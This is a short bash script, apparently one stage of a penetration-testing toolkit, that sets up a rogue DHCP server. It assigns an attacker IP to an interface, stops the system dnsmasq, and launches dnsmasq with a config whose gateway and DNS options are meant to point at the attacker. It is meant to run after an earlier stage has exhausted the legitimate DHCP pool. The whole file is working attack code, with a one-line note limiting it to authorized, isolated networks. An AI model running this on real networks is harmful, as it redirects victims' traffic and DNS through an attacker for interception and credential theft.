#!/usr/bin/env bash
# Phase 3 - start the rogue DHCP server.
# Gives the attacker interface a static IP and launches dnsmasq with our config.
# Run after phase 2 has drained the real pool.
#   sudo ./setup_rogue_dhcp.sh eth0 192.168.1.66/24
# Authorized, isolated networks only - see ../../DISCLAIMER.md.
set -euo pipefail

IFACE="${1:-eth0}"
ATTACKER_IP="${2:-192.168.1.66/24}"
CONF="$(dirname "$0")/dnsmasq.conf"

if [[ $EUID -ne 0 ]]; then
  echo "[-] run as root (sudo)" >&2
  exit 1
fi

if ! command -v dnsmasq >/dev/null 2>&1; then
  echo "[-] dnsmasq not installed: sudo apt install -y dnsmasq" >&2
  exit 1
fi

echo "[*] giving ${IFACE} the address ${ATTACKER_IP}"
ip addr add "${ATTACKER_IP}" dev "${IFACE}" 2>/dev/null || echo "    (already set, continuing)"
ip link set "${IFACE}" up

# stop the system dnsmasq so it doesn't clash with ours
systemctl stop dnsmasq 2>/dev/null || true

echo "[*] starting dnsmasq (${CONF}). Ctrl-C to stop."
echo "    make sure option 3/6 in the config point at ${ATTACKER_IP%%/*}"
# -d keeps it in the foreground so we can watch leases go out
exec dnsmasq --conf-file="${CONF}" -d
